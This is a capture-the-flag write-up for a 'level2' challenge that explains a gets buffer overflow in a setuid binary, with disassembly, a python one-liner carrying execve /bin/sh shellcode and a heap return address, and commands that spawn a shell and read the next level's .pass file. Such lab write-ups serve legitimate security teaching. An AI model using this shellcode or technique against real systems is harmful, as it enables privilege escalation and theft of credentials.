# Level2

## Solution

* There is one file in our home, ```level1```, belonging to ```level2``` user, with suid.
* Here's the hand-decompiled source code we propose for this binary: [source.c](source.c)

* The only purpose of the ```main``` function is to call ```p``` function.

* Here is the disassembled ```p``` function:
```
   0x080484d4 <+0>:	push   ebp
   0x080484d5 <+1>:	mov    ebp,esp
   0x080484d7 <+3>:	sub    esp,0x68
   0x080484da <+6>:	mov    eax,ds:0x8049860
   0x080484df <+11>:	mov    DWORD PTR [esp],eax
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
   0x080484ea <+22>:	mov    DWORD PTR [esp],eax
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
   0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080484fb <+39>:	and    eax,0xb0000000
   0x08048500 <+44>:	cmp    eax,0xb0000000
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    eax,0x8048620
   0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
   0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
   0x08048513 <+63>:	mov    DWORD PTR [esp],eax
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    eax,[ebp-0x4c]
   0x0804852a <+86>:	mov    DWORD PTR [esp],eax
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    eax,[ebp-0x4c]
   0x08048535 <+97>:	mov    DWORD PTR [esp],eax
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave
   0x0804853e <+106>:	ret
```

* Several interesting information about it:

	* ```p``` calls ```gets``` function at offset ```25``` : we can potentially exploit it to do a buffer overflow attack
	* between offsets ```30``` and ```49```, the program checks that the former value of ```eip```, located at ```ebp + 0x4```, doesn't start with ```b``` value : indeed it would indicate a try to execute code on the stack. If the value starts with ```b```, the program exits.
	* at offset ```100```, there is a call to ```strdup```: what we wrote thanks to ```gets``` function will now be copied on the heap

	
* What we did with all of this:

	* the goal was to perform a buffer overflow attack, by writing a shell code located in the buffer used for ```gets``` function, and a new address to replace the former ```eip```.
	* to get the shell code, we compiled ```shellcode.s``` with ```nasm -f elf32 shellcode2.s -o shellcode``` and got the bytecode thanks to ```objdump -d shellcode```
	* we then launched the following command in the vm:
	```sh
	python -c "print('\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xcd\x80' + '\x90' * 55 +  '08a00408'.decode('hex'))" > /var/crash/lvl2
	 ```

	* the first 25 bytes are the shellcode itself
	* the 55 following bytes allow us to reach ```ebp + 0x4```, that is to say the former ```eip``` that will be poped at the end of ```p``` function (```0x4c (buffer size) + 0x4 (for former value of ebp) - 0x19 (size of the shell code) = 0x37)```)
	* the final 4 bytes are the little endian written address located on the heap of the buffer used by ```gets```: at the end of ```p```  function, the next instruction read will be our shellcode :)
	* finally, to get the flag, we laumch :
	```sh
	cat /var/crash/lvl2 - | ./level2
	```
	* it opens a shell with ```level3``` user permissions and we can do the following:
	```sh
	cd ../level3; cat .pass
	```




